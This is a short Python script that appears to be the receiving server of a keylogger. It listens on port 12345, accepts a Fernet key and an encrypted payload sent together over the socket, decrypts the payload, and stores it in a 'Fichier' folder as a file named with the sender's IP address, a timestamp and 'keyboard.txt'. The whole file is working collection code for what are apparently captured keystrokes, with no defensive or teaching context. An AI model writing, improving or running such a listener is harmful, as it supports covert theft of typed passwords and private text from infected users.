
import socket
from cryptography.fernet import Fernet
import datetime
import os
import traceback

def receive_and_decrypt_file(server_port):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(("0.0.0.0", server_port))
        server_socket.listen(1)

        print(f"Server listening on port {server_port}")

        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")

        key = client_socket.recv(1024)
        encrypted_text = client_socket.recv(4096)

        cipher_suite = Fernet(key)
        decrypted_text = cipher_suite.decrypt(encrypted_text)

        # Create a directory named "Fichier" if it doesn't exist
        directory = "Fichier"
        os.makedirs(directory, exist_ok=True)

        # Create a filename based on client IP and current date-time within the "Fichier" directory
        ip_personne = client_address[0]
        filename = os.path.join(directory, f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt")

        with open(filename, "wb") as file:
            file.write(decrypted_text)

        print(f"File received, decrypted, and saved as {filename} successfully.")

    except Exception as e:
        print("An error occurred:")
        traceback.print_exc()
        print(f"Error message: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    server_port = 12345
    receive_and_decrypt_file(server_port)
